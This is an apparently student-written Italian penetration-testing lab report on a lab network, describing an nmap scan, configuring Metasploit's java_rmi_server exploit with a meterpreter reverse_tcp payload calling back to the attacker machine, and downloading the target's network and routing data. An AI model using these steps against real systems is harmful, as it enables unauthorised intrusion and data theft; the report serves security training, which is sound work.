ESERCITAZIONE S7 L5 - PROGETTO

0 - configurazione di rete dell'attaccante e del target:
	Attaccante 192.168.11.111, Target 192.168.11.112

1 - avvio msfconsole:
	- scansione della macchina vittima usando nmap: nmap -sS -sV -Pn -A -O <IP Target>
	- individuazione della porta 1099 con servizio java-rmi

2 - ricerca e configurazione: 
	- comando "search" per cercare nella libreria exploit compatibili (exploit=multi/misc/java_rmi_server)
	- scelta con "set" del exploit
	- settaggio dell'exploit sempre con "set":
		- HTTPDELAY = 20
		- RHOSTS = 192.168.11.112, RPORT = 1099
		- LHOST = 192.168.11.111con, LPORT = 4444 
		- SRVHOST = 127.0.0.1, SRVPORT = 8080
		- payload=java/meterpreter/reverse_tcp
		(ho fatto vari tentativi falliti, con exploit differenti ma sempre riconducibili a al java_rmi, e con 				payload differenti [payload generico, payload meterpreter/reverse_tcp, payload linux x86])

3 - run exploit, si ottiene accesso alla macchina target tramite terminale meterpreter:
	- verifico configurazioni rete e arp table
	- accendo una shell per :
		- creo un file sul dispositivo target "network_config" 
		- ci scrivo dentro le configurazioni di rete e la tabella di routing con il con combinazione di "echo", ">" or 				">>", "servizio richiesto", "directory del file",
		- poi lo scarico sulla macchina attaccante con "download" da meterpreter
